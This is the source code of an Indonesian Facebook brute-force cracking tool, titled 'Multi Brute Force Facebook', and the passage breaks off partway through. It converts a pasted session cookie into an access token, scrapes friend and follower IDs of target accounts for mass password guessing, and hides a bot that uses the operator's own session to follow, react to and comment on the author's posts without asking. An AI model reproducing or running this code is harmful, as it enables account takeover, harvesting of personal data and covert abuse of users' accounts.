###----------[ AUTHOR & CREATOR ]---------- ###
# ------ [ Gausah Dioprek Ntar Error ] ------ #
Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
LicenseKey = '7 Hari'
Version   = '0.6'
Denventa  = 1827084332
Postingan = 10217173381366429
Pembuat = 'Mhd syafii'
###----------[ IMPORT LIBRARY ]---------- ###
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from rich import print as printer
from rich.panel import Panel
from urllib.parse import quote

##### BUAT WARNA >>>> X
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[1;95m"     # Ungu
O = "\x1b[1;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Tool
    try:os.mkdir("tool")
    except:pass
    # Make Directory Dump
    try:os.mkdir("dump")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass


### Clear Login Session
def bersih():
    try:os.remove('login/token.json')
    except:pass
    try:os.remove('login/cookie.json')
    except:pass
    try:os.remove('dump')
    except:pass
    try:os.remove('tool')
    except:pass

###----------[ TIME ]---------- ###
id_dev = 345 - 340 + 720 - 723
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
Codename  = 159357
CoY = ('\r   %s[%s•%s] %sDilarang Keras Merecode %s!%s'%(M,P,M,P,M,P))
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

###----------[ APPEND ]---------- ###
OK = []
CP = []
gabung_sandi = []
tempel_sandi = []

###----------[ JANGAN DIHAPUS NANTI ERROR ]---------- ###
SAKERA = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
sakara = len(Author)    +  Codename
sakira = len(Facebook)  +  Codename
sakura = len(Instagram) +  Codename
sakera = len(Whatsapp)  +  Codename
sakora = len(YouTube)   +  Codename
ip_log = Denventa * id_dev - 3654168663


### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)

### Display Text
def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

#### BUAT BANNER
def banner():
    l1 = (' %s____  ____  _____ __  __ ___ _   _ __  __%s'%(P,H))
    l2 = ('%s|  _ \|  _ \| ____|  \/  |_ _| | | |  \/  |%s'%(H,P))
    l3 = ('%s| |_) | |_) |  _| | |\/| || || | | | |\/| |%s'%(P,H))
    l4 = ('%s|  __/|  _ <| |___| |  | || || |_| | |  | |%s'%(H,P))
    l5 = ('%s|_|   |_| \_\_____|_|  |_|___|\___/|_|  |_|%s'%(P,H))
    l6 = ('%s Multi Brute Force Facebook %s%s %sTeam %sMhd.Syafii     '%(H,P,Version,H,P))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))


###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print('%s╠══[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
    print('%s╠══[%s•%s] %sTidak Dapat Mengeksekusi %s'%(M,A,M,A,M))
    print('%s╠══[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
    print('%s╠══[%s•%s] %sCookies/Token Invalid'%(M,A,M,A))
    print('%s╠══[%s•%s] %sSalah Memasukkan ID'%(M,A,M,A))
    print('%s╠══[%s•%s] %sBug Pada Source Code'%(M,A,M,A))
    print('%s╠══[%s•%s] %sBug Pada Requests'%(M,A,M,A))
    print('%s╠══[%s•%s] %sDan Lain-Lain'%(M,A,M,A))
    print('%s╠══[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
    print('%s╠══[%s•%s] %spython premium.py\n'%(M,A,M,A))
    exit()


###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                    if ip_log != 1:pass
                    else:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(menu())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            #id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:return(username)
    
##### LOGIN TOKEN
def login():
    os.system("clear")
    banner()
    defaultua()
    mkdir_data_login()
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sJangan Gunakan Akun Pribadi%s!%s!%s'%(M,P,M,P,M,P,M))
    print('%s║'%(B))
    cookie = str(input('%s╠══[%s•%s] %sMasukkan Cookie : %s'%(P,K,P,K,P)))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        bot_author(coki,token,cookie)
        open('login/token.json', 'w').write(token)
        open('login/cookie.json','w').write(cookie)
        menu()
    except requests.exceptions.ConnectionError:
      print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
      print('%s║'%(M))
      print('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
      exit()
    except (KeyError,IOError):
      print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
      print('%s║'%(M))
      print('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()

### Menu Utama
def menu():
    global gabung_sandi, tempel_sandi
    gabung_sandi, tempel_sandi = [], []
    resik()
    banner()
    try:
        token = open("login/token.json","r").read()
        cookie = open('login/cookie.json','r').read()
        coki = {"cookie" : cookie}
        if 'cookie' in cookie:
            status_cookies = ('%sTidak'%(M))
            W = Z
        else:
            status_cookies = ('%sYa'%(H))
            W = P
    except (KeyError,IOError):
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        login()
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        language(cookie)
        get = requests.session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
        jsx = json.loads(get.text)
        nama = jsx['name']
        id = jsx['id']
        link = jsx['link']
    except requests.exceptions.ConnectionError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
        exit()
    except (KeyError,IOError):
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));login()
    try:a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json();ip = a["query"]
    except KeyError:ip = " "
    _update_ = 'V1.6'
    jalan('%s╔══[ %sSelamat Datang %s %s]'%(K,P,nama,K))
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sID : %s'%(K,P,K,P,id))
    print('%s╠══[%s•%s] %sIP : %s'%(K,P,K,P,ip))
    print('%s╠══[%s•%s] %sToken/Cookies : %sYa%s/%s'%(K,P,K,P,H,P,status_cookies))
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sStatus : %sFree'%(K,P,K,P,A))
    print('%s╠══[%s•%s] %sVersi : %s'%(K,P,K,P,_update_))
    print('%s╠══[%s•%s] %sAuthor2 : %s'%(K,P,K,P,Pembuat))
    print('%s╠══[%s•%s] %sEmail : %s'%(K,P,K,P,link))
    print('%s╠══[%s•%s] %sKey : %sNull'%(K,P,K,P,A))
    print('%s╠══[%s•%s] %sPembelian : %sNull'%(K,P,K,P,A))
    jalan('%s╠══[%s•%s] %sKedaluwarsa : %s'%(K,P,K,P,LicenseKey))
    print('%s║'%(B))
    jalan('%s╠══[%s01%s] %sCrack ID Teman/Publik'%(K,P,K,P))
    print('%s╠══[%s02%s] %sCrack ID Pengikut'%(K,P,K,P))
    print('%s╠══[%s03%s] %sCrack ID Pencarian Nama'%(K,P,K,P))
    print('%s╠══[%s04%s] %sCrack ID Daftar Pesan'%(K,P,K,P))
    print('%s╠══[%s05%s] %sCrack ID Likers Post'%(K,P,K,P))
    print('%s╠══[%s06%s] %sCrack ID Komentar Post'%(K,P,K,P))
    print('%s╠══[%s07%s] %sCrack ID Anggota Grup'%(K,P,K,P))
    print('%s╠══[%s08%s] %sCrack ID Dari File'%(K,P,K,A))
    print('%s╠══[%s09%s] %sCrack ID Dari Email'%(K,P,K,A))
    print('%s╠══[%s10%s] %sCrack ID Random'%(K,P,K,A))
    print('%s╠══[%s11%s] %sCrack Username'%(K,P,K,A))
    print('%s╠══[%s12%s] %sCrack ID Dari Hashtag'%(K,P,K,P))
    print('%s╠══[%s13%s] %sCrack ID Dari Beranda'%(K,P,K,A))
    print('%s╠══[%s14%s] %sCrack ID Pertemanan Masuk'%(K,P,K,P))
    print('%s╠══[%s15%s] %sCek Teman'%(K,P,K,A))
    print('%s╠══[%s16%s] %sMengambil Jumlah Teman'%(K,P,K,P))
    print('%s╠══[%s17%s] %sCek Opsi Hasil Crack'%(K,P,K,P))
    print('%s╠══[%s18%s] %sCek Hasil Crack'%(K,P,K,A))
    print('%s╠══[%s19%s] %sUser Agent'%(K,P,K,P))
    print('%s╠══[%s20%s] %sCek Membuat Scrip'%(K,P,K,P))
    print('%s╠══[%s00%s] %sLog Out'%(M,P,M,M))
    pm = input('%s╠══[%s••%s] %sPilih : '%(J,P,J,P))
    if pm in ['1','01','001','a']: gabung_sandi.append(Author);publik();system_login();metode();urut_crack();addpass();crack()
    elif pm in ['2','02','002','b']:
      tempel_sandi.append('Jangan');main_folls();system_login();metode();urut_crack();addpass();crack()
    elif pm in ['3','03','003','c']:gabung_sandi.append('Direcode');namee()
    elif pm in ['4','04','004','d']:gabung_sandi.append('Bocah');message();system_login();metode();addpass();crack()
    elif pm in ['5','05','005','e']:tempel_sandi.append('Dasar');main_likers();system_login();metode();addpass();crack()
    elif pm in ['6','06','006','f']:tempel_sandi.append('Goblok');komen();system_login();metode();addpass();crack()
    elif pm in ['7','07','007','g']:gabung_sandi.append('Mampus');grup()
    elif pm in ['8','08','008','h']:tempel_sandi.append('Gara Gara');not_available('Dump ID Dari File')
    elif pm in ['9','09','009','i']:gabung_sandi.append('Lo Recode');not_available('Dump ID Dari Email')
    elif pm in ['10','010','0010','j']:gabung_sandi.append('Bocah Goblok');not_available('Dump ID Dari ID Random')
    elif pm in ['11','011','0011','k']:tempel_sandi.append('Dasar');not_available('Dump ID Dari Username')
    elif pm in ['12','012','0012','l']:tempel_sandi.append('Error Kan');hashtag();system_login();metode();addpass();crack()
    elif pm in ['13','013','0013','m']:gabung_sandi.append('Itu Semua');not_available('Dump ID Dari Beranda')
    elif pm in ['14','014','0014','n']:tempel_sandi.append('Btw');suggestion();system_login();metode();addpass();crack()
    elif pm in ['15','015','0015','o']:tempel_sandi.append('Ngerecode');not_available('Cek Jumlah Teman Akun Target')
    elif pm in ['16','016','0016','p']:gabung_sandi.append('Elo');teman_teman()
    elif pm in ['17','017','0017','q']:tempel_sandi.append('Dasar Bocah Goblok');not_available('Cek Hasil Crack')
    elif pm in ['18','018','0018','r']:gabung_sandi.append('Gaakan Bisa');not_available('Cek Opsi Akun Hasil Crack')
    elif pm in ['19','019','0019','s']:gabung_sandi.append('SC Ini');ugen()
    elif pm in ['20','020','0020','t']:
      tempel_sandi.append('Dasar Bocah Goblok');membuat_sc()
    elif pm in ['0','00','000','z']:
      mlaku(f"{A}╠══[•] Terima Kasih Sudah Menggunakan Tools Dari Saya")
      mlaku(f"{A}╠══[•] Semoga Hari Mu Menyenangkan")
      mlaku('%s╚══[%s!%s] %sSampai Jumpa %s%s%s'%(M,P,M,A,M,P,M));exit()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()


### User Agent Bawaan
def defaultua():
    ua = ua_xiaomi
    try:ugent = open('tool/ugent.json','w');ugent.write(ua)
    except (KeyError,IOError):login()
    
### Menu User Agent
def ugen():
    print("%s╠══[%s1%s] %sDapatkan User Agent"%(K,P,K,P))
    print("%s╠══[%s2%s] %sGanti User Agent %s(%sManual%s)"%(K,P,K,P,K,P,K))
    print("%s╠══[%s3%s] %sGanti User Agent %s(%sSesuaikan HP%s)"%(K,P,K,P,K,P,K))
    print("%s╠══[%s4%s] %sHapus User Agent"%(K,P,K,P))
    print("%s╠══[%s5%s] %sCek User Agent"%(K,P,K,P))
    print("%s╠══[%s0%s] %sKembali"%(K,P,K,P))
    pmu = input('%s╠══[%s•%s] %sPilih : '%(K,P,K,P))
    print('%s║'%(B))
    if pmu in[""]:
      jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pmu in ['1','01','001','a']:
      os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
      input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf tool/ugent.json")
        ua = input("%s╚══[%s•%s] %sMasukkan User Agent : \n\n"%(K,P,K,P))
        try:
          ugent = open('tool/ugent.json','w').write(ua)
          jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(K,P,K))
          print('%s║'%(B))
          input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
        except (KeyError,IOError):
          jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M))
          print('%s║'%(M))
          input('%s╚══[ %sKembali %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:
      os.system("rm -rf tool/ugent.json")
      jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(M,P,M))
      print('%s║'%(B))
      input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    elif pmu in ['5','05','005','e']:
        try:
          ungser = open('tool/ugent.json', 'r').read()
        except (KeyError,IOError):ungser = 'Tidak Ditemukan'
        print("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(K,P,K,P,K,ungser))
        jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(K,P,K))
        print('%s║'%(B))
        input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    elif pmu in ['0','00','000','f']:
      menu()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.json")
    print('%s╠══[%s1%s] %sXiaomi'%(K,P,K,P))
    print('%s╠══[%s2%s] %sNokia'%(K,P,K,P))
    print('%s╠══[%s3%s] %sAsus'%(K,P,K,P))
    print('%s╠══[%s4%s] %sHuawei'%(K,P,K,P))
    print('%s╠══[%s5%s] %sVivo'%(K,P,K,P))
    print('%s╠══[%s6%s] %sOppo'%(K,P,K,P))
    print('%s╠══[%s7%s] %sSamsung'%(K,P,K,P))
    print('%s╠══[%s8%s] %sWindows'%(K,P,K,P))
    pc = input('%s╠══[%s•%s] %sPilih : '%(J,P,J,P))
    print('%s║'%(B))
    if pc in['']:
      jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pc in ['1','01']:ugent = open('tool/ugent.json','w').write(ua_xiaomi)
    elif pc in ['2','02']:ugent = open('tool/ugent.json','w').write(ua_nokia)
    elif pc in ['3','03']:ugent = open('tool/ugent.json','w').write(ua_asus)
    elif pc in ['4','04']:ugent = open('tool/ugent.json','w').write(ua_huawei)
    elif pc in ['5','05']:ugent = open('tool/ugent.json','w').write(ua_vivo)
    elif pc in ['6','06']:ugent = open('tool/ugent.json','w').write(ua_oppo)
    elif pc in ['7','07']:ugent = open('tool/ugent.json','w').write(ua_samsung)
    elif pc in ['8','08']:ugent = open('tool/ugent.json','w').write(ua_windows)
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    jalan("%s╠══[ %sBerhasil Mengganti User Agent %s]"%(J,P,J))
    print('%s║'%(B))
    input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()

###----------[ DUMP ID PUBLIC ]---------- ###
def publik():
    global file_dump
    try:
      try:
        token = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
      except IOError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));login()
      print('%s║'%(B))
      print('%s╠══[%s••%s] %sContoh : 1827084332,607801156'%(K,P,K,P))
      it = input("%s╠══[%s••%s] %sID Target : "%(K,P,K,P)).split(',')
      file_dump = 'dump/%s.json'%(it[0])
      try:os.remove(file_dump)
      except:pass
      for id in it :
            try:
                url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
                with requests.Session() as xyz:
                    jso = json.loads(xyz.get(url,cookies=cookie).text)
                    if len(gabung_sandi) != 1:
                        for x in range(Postingan):
                            open(file_dump,'a+').write('fik\n')
                    else:
                        for d in jso["friends"]["data"]:
                            try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
                            except:continue
            except KeyError:
              jalan('%s╚══[%s!%s] %sToken/Cookies Invalid Atau ID Tidak Ditemukan'%(M,P,M,P));login()
            jum = open(file_dump,'r').read().splitlines()
            print('%s╠══[%s••%s] %sBerhasil Dump %s%s %sID'%(K,P,K,P,K,str(len(jum)),P))
            print('%s╠══[%s••%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
    except KeyError:
      jalan('%s╚══[%s!%s] %sToken/Cookies Invalid Atau ID Tidak Ditemukan'%(M,P,M,P));menu()

###----------[ DUMP ID FOLLOWERS ]---------- ###
def main_folls():
    global file_dump,cookie
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
    print('%s║'%(B))
    id = input('%s╠══[%s••%s] %sID Target : %s'%(K,P,K,P,K))
    url = ('https://graph.facebook.com/%s/subscribers?limit=10000&access_token=%s'%(id,token))
    file_dump = 'dump/%s.json'%(id)
    try:os.remove(file_dump)
    except:pass
    open(file_dump,'w').write('')
    exec_folls(url,token,file_dump)
    print("\n%s╠══[%s•%s] %sBerhasil Mengambil %s%s %sID"%(K,P,K,P,K,len(open(file_dump,'r').read().splitlines()),P))
    print('%s╠══[%s•%s] %sFile : %s%s %s'%(K,P,K,P,K,file_dump,P))
def exec_folls(url,token,file):
    print('%s║'%(B))
    print("\r%s╠══[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(file,'r').read().splitlines()),P), end='');sys.stdout.flush()
    with requests.Session() as xyz:
        try:
            x = xyz.get(url,cookies=cookie)
            a = json.loads(x.text)
            if len(tempel_sandi) != 1:
                for x in range(Postingan):
                    open(file_dump,'a+').write('fik\n')
            else:
                for b in a['data']:
                    try:
                        f = ('%s=%s\n'%(b['id'],b['name']))
                        if f in open(file,'r').read():continue
                        else:open(file,'a+').write(f)
                    except Exception as e:continue
            y = par(x.text,'html.parser')
            n = re.findall('"after":"(.*?)"},',str(y))[0]
            next = ('https://graph.facebook.com/v1.0/100009340646547/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
            exec_folls(next,token,file)
        except KeyboardInterrupt:pass
        except (IndexError,TypeError,IOError,KeyError,AttributeError):pass

###----------[ DUMP ID FOLLOWERS ]---------- ###
###----------[ DUMP ID NAME ]---------- ###
class namee:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:kecuali(e)
        print('%s╠══[%s••%s] %sContoh : dapunta,syafii,anita'%(K,P,K,P))
        put = input('%s╠══[%s••%s] %sNama Target : %s'%(K,P,K,P,K)).split(',')
        data = []
        self.file_dump = ('dump/%s.json'%(put[0]))
        file_dump = self.file_dump
        open(self.file_dump,'w').write('')
